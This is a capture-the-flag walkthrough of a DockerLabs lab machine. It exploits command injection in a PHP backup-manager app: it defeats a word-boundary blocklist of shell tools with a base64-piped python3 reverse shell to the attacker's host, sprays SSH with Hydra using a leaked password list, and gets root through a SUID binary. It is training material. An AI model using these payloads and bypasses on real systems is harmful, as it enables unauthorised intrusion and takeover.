# Internal

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Internal | buda-sys | Facil | DockerLabs |

**Summary:** The Internal machine exposed a deceptively sophisticated attack surface built around a custom PHP web application called SysVault Backup Manager, accessible via virtual host enumeration. The application featured a "Directory Inspector" that passed user-supplied path input directly into a `shell_exec()` call, creating a classic OS command injection vulnerability. However, a layered WAF and blacklist system stood between the attacker and code execution: operator-level filters blocked semicolons, double-ampersands, backticks, and newlines, while a word-boundary regex blacklist prohibited common shell utilities including `id`, `cat`, `bash`, `sh`, and `python`. The key insight was that `python3` was not blocked because the regex pattern `\bpython\b` fails to match `python3` due to the trailing digit breaking the word boundary. This allowed a novel bypass chain: base64-encoding a Python reverse shell payload and piping it through `printf | base64 -d | python3`, which the WAF evaluated as an inert string of alphanumeric characters. Once a foothold was established as `www-data`, post-exploitation enumeration revealed a world-readable password list at `/opt/.vault_pass.txt` belonging to the `vault` group. A credential spray via Hydra identified the correct SSH password, granting access as the `vault` user. Privilege escalation to root was then trivially achieved by executing the SUID binary `/usr/local/bin/vaultctl`, which was owned by root but restricted to members of the `vault` group and internally invoked `setuid(0)` followed by a root shell spawn.

---

## Reconnaissance

The machine was deployed and its IP address stored in a variable:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl]
└─$ sudo bash auto_deploy.sh internal.tar   

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl]
└─$ ip=172.17.0.2           
                                                                                  
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl]
└─$ nmap -sC -sV -p- -T4 $ip
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-22 18:53 WIB
Nmap scan report for 172.17.0.2
Host is up (0.0000080s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f9:66:aa:77:67:23:c3:15:5a:fb:3d:02:08:71:c7:9f (ECDSA)
|_  256 82:a2:e0:d9:84:da:39:bf:da:06:51:b8:3b:32:9a:60 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://internal.dl/
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nmap revealed two open ports: SSH on 22 and Apache on 80. The HTTP server redirected to the virtual hostname `internal.dl`, which was added to the local hosts file:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl]
└─$ echo '172.17.0.2 internal.dl' | sudo tee -a /etc/hosts
```

---

## Virtual Host Discovery

Virtual host fuzzing was performed using `ffuf` with the `Host` header:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl]
└─$ ffuf -u "http://internal.dl/" -H "Host: FUZZ.internal.dl" -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://internal.dl/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Header           : Host: FUZZ.internal.dl
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

backup                  [Status: 200, Size: 22554, Words: 4271, Lines: 812, Duration: 149ms]
Backup                  [Status: 200, Size: 22554, Words: 4271, Lines: 812, Duration: 7ms]
:: Progress: [220559/220559] :: Job [1/1] :: 10000 req/sec :: Duration: [0:00:43] :: Errors: 0 ::
                                                                                                                           
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl]
└─$ echo '172.17.0.2 backup.internal.dl' | sudo tee -a /etc/hosts
172.17.0.2 backup.internal.dl
```

The subdomain `backup.internal.dl` was discovered and resolved to the target. Navigating to it revealed the SysVault Backup Manager, a dark-themed internal web application with a "Directory Inspector" input field labeled prominently with a "SHELL EXEC" badge.

![SysVault Backup Manager](image.png)

---

## Web Application Analysis and WAF Bypass

Reading the PHP source code of the application (obtained after gaining a foothold) revealed the vulnerable sink and the WAF logic:

```php
// WAF: blocks operators
$blocked_operators = [';', '&&', '||', '`', '\n'];

// Blacklist: blocks commands using WORD BOUNDARY regex
$blocked_commands = [
    'whoami', 'id', 'ls', 'pwd', 'cat', 'wget', 'curl',
    'bash', 'sh', 'python', 'perl', 'nc', 'netcat', 'find',
    'echo', 'rm', 'cp', 'mv', 'chmod', 'chown'
];
foreach ($blocked_commands as $cmd) {
    if (preg_match('/\b' . preg_quote($cmd, '/') . '\b/i', $input)) { /* block */ }
}

// VULNERABLE SINK
$cmd = "ls -lah " . $dir . " 2>&1";
$output = shell_exec($cmd . ' & echo ok');
```

Two critical weaknesses were identified. First, the single pipe `|` and background operator `&` are not blocked, only their doubled variants `&&` and `||`. Second, the word-boundary regex `\bpython\b` does not match the string `python3` because the digit `3` is treated as a word character, eliminating the boundary between `python` and `3`. This meant `python3` passed the blacklist entirely.

The bypass chain was constructed as follows: a Python reverse shell script was base64-encoded locally, then delivered to the Directory Inspector wrapped in a `$(printf "..." | base64 -d | python3)` subshell. The WAF evaluated this as a string of inert alphanumeric base64 characters and permitted it through.

---

## Initial Access

A netcat listener was started on the attacking machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

The reverse shell payload was generated:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl]
└─$ echo -e 'import socket,subprocess\ns=socket.socket()\ns.connect(("172.17.0.1",4444))\np=subprocess.Popen(["/bin/bash","-i"],stdin=s,stdout=s,stderr=s)\np.wait()' | base64 -w0
aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzCnM9c29ja2V0LnNvY2tldCgpCnMuY29ubmVjdCgoIjE3Mi4xNy4wLjEiLDQ0NDQpKQpwPXN1YnByb2Nlc3MuUG9wZW4oWyIvYmluL2Jhc2giLCItaSJdLHN0ZGluPXMsc3Rkb3V0PXMsc3RkZXJyPXMpCnAud2FpdCgpCg==
```

The following payload was submitted into the Directory Inspector input field:

```bash
$(printf "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzCnM9c29ja2V0LnNvY2tldCgpCnMuY29ubmVjdCgoIjE3Mi4xNy4wLjEiLDQ0NDQpKQpwPXN1YnByb2Nlc3MuUG9wZW4oWyIvYmluL2Jhc2giLCItaSJdLHN0ZGluPXMsc3Rkb3V0PXMsc3RkZXJyPXMpCnAud2FpdCgpCg==" | base64 -d | python3)
```

The connection was established and the shell was stabilized:

```bash
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 39786
bash: cannot set terminal process group (33): Inappropriate ioctl for device
bash: no job control in this shell
www-data@d02165f12cd9:/var/www/admin$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@d02165f12cd9:/var/www/admin$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@d02165f12cd9:/var/www/admin$ export TERM=xterm
www-data@d02165f12cd9:/var/www/admin$ export SHELL=/bin/bash
www-data@d02165f12cd9:/var/www/admin$ stty rows 80 cols 150
```

A foothold was established as `www-data`.

---

## Post-Exploitation Enumeration

### SUID Binary Discovery

```bash
www-data@d02165f12cd9:/$ find / -type f -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/local/bin/vaultctl
/usr/bin/chsh
/usr/bin/umount
/usr/bin/su
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chfn
www-data@d02165f12cd9:/$ ls -la /usr/local/bin/vaultctl 
-rwsr-xr-- 1 root vault 16136 Feb 25 15:00 /usr/local/bin/vaultctl
```

The binary `vaultctl` stood out immediately: owned by root with the SUID bit set, but executable only by members of the `vault` group. Direct execution as `www-data` was not possible, establishing `vault` as the required pivot user.

### Credential Discovery

```bash
www-data@d02165f12cd9:/$ find / -user vault -readable 2>/dev/null
/opt/vaultlibs/libbackup.so
www-data@d02165f12cd9:/$ ls -la /opt/vaultlibs/libbackup.so 
-rwxrwxr-x 1 vault vault 15656 Feb 26 10:50 /opt/vaultlibs/libbackup.so
www-data@d02165f12cd9:/$ which wc
/usr/bin/wc
www-data@d02165f12cd9:/$ wc /opt/vaultlibs/libbackup.so 
    3    46 15656 /opt/vaultlibs/libbackup.so
```

```bash
www-data@d02165f12cd9:/$ find / -group vault -readable 2>/dev/null
/usr/local/bin/vaultctl
/opt/vaultlibs
/opt/vaultlibs/libbackup.so
/opt/.vault_pass.txt
```

A hidden password list accessible to the `vault` group was found at `/opt/.vault_pass.txt`:

```bash
www-data@d02165f12cd9:/$ cat /opt/.vault_pass.txt 
X#9mK$vL2@pQ
nR7!wZ3&eT5*
Hy6@jP2#mX8$
qB4!nW9&kL3@
Vz8#cR5$xJ2!
mT3@bY7!pN6&
Kw5$hM2#fQ9@
eL8!vX4&nB6*
Rj2@cT7#wP5$
uN9&mK3!xZ4@
Fb6#yH8$qW2!
sG4@tL5&rJ9*
Dp7!kM3#bX6@
aC2$vN8!wQ5&
Xt9@eR4#hL7$
oW3&jB6!mT2#
Yk8$pZ5@cN4!
iH2#xQ9&fR7*
Mn5!bL3$vW8@
Gq4@tX7#eK2&
```

The list was saved locally and a credential spray was performed against SSH with Hydra:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl]
└─$ vim pass.txt 

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl]
└─$ hydra -l vault -P pass.txt ssh://172.17.0.2
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-22 20:23:37
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 20 login tries (l:1/p:20), ~2 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: vault   password: Yk8$pZ5@cN4!
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-22 20:23:44
```

---

## Privilege Escalation: SUID Binary Abuse

SSH login was performed as `vault`:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl]
└─$ ssh vault@$ip
vault@172.17.0.2's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.18.33.2-microsoft-standard-WSL2 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Thu Feb 26 10:55:44 2026 from 172.17.0.1
vault@d02165f12cd9:~$ id;whoami;hostname
uid=1001(vault) gid=1001(vault) groups=1001(vault),100(users)
vault
d02165f12cd9
vault@d02165f12cd9:~$ ls -la
total 32
drwxr-x--- 1 vault    vault 4096 Feb 25 19:13 .
drwxr-xr-x 1 root     root  4096 Feb 25 13:22 ..
lrwxrwxrwx 1 root     root     9 Feb 25 19:13 .bash_history -> /dev/null
-rw-r--r-- 1 vault    vault  220 Feb 25 13:22 .bash_logout
-rw-r--r-- 1 vault    vault 3771 Feb 25 13:22 .bashrc
drwx------ 2 vault    vault 4096 Feb 25 15:04 .cache
drwxrwxr-x 3 vault    vault 4096 Feb 25 15:04 .local
-rw-r--r-- 1 vault    vault  807 Feb 25 13:22 .profile
-rw-r--r-- 1 www-data vault 1787 Feb 25 15:21 flag.txt
```

Since `vault` belongs to the `vault` group, the SUID binary could now be executed:

```bash
vault@d02165f12cd9:~$ vaultctl
root@d02165f12cd9:~# id
uid=0(root) gid=0(root) groups=0(root),100(users),1001(vault)
root@d02165f12cd9:~# su -
root@d02165f12cd9:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
d02165f12cd9
```

The binary internally invoked `setuid(0)` and spawned a root shell. Full system compromise was achieved.

---

## Flag

```bash
vault@d02165f12cd9:~$ cat flag.txt 

 ███████╗██╗   ██╗███████╗██╗   ██╗ █████╗ ██╗   ████████╗
 ██╔════╝╚██╗ ██╔╝██╔════╝██║   ██║██╔══██╗██║   ╚══██╔══╝
 ███████╗ ╚████╔╝ ███████╗██║   ██║███████║██║      ██║   
 ╚════██║  ╚██╔╝  ╚════██║╚██╗ ██╔╝██╔══██║██║      ██║   
 ███████║   ██║   ███████║ ╚████╔╝ ██║  ██║███████╗ ██║   
 ╚══════╝   ╚═╝   ╚══════╝  ╚═══╝  ╚═╝  ╚═╝╚══════╝ ╚═╝  

  ----------------------------------------
  🏁  CHALLENGE FLAG — SysVault Backup Lab
  ----------------------------------------

  FLAG{CMD[REDACTED]}

  ----------------------------------------
  Techniques required to reach this file:
  ----------------------------------------

  [✓] 1. Bypass WAF operator filter
          → Used newline (%7C) instead of ; && ||

  [✓] 2. Bypass space blacklist
          → Used $IFS  instead of space

  [✓] 3. Bypass command blacklist
          → Used quotes: c'a't, or base64 encoding
            or reversed command: $(rev<<<'tac')

  [✓] 4. Read this file
          → /flag.txt

  ----------------------------------------
  Congratulations! You have demonstrated:
  - WAF evasion
  - Blacklist bypass (spaces, commands, operators)
  - OS command injection via shell_exec()
  ----------------------------------------
```

---

## Attack Chain Summary

1. **Reconnaissance**: Full port scan identified SSH and Apache. Nmap revealed a virtual host redirect to `internal.dl`.
2. **Virtual Host Discovery**: `ffuf` Host header fuzzing uncovered `backup.internal.dl`, hosting the SysVault Backup Manager application.
3. **WAF Analysis**: Source code review revealed that the word-boundary regex `\bpython\b` does not match `python3`, the single pipe `|` and background operator `&` are permitted, and user input flows directly into `shell_exec()` unsanitized.
4. **Exploitation**: A Python reverse shell was base64-encoded and delivered via `$(printf "BASE64" | base64 -d | python3)`. The WAF saw only alphanumeric base64 characters and permitted the request. A `www-data` foothold was established.
5. **Credential Discovery**: Post-exploitation enumeration found `/opt/.vault_pass.txt` readable by the `vault` group. Hydra credential spray against SSH identified `vault:Yk8$pZ5@cN4!`.
6. **Privilege Escalation**: The SUID binary `/usr/local/bin/vaultctl`, restricted to the `vault` group and owned by root, was executed and spawned a root shell via `setuid(0)`.
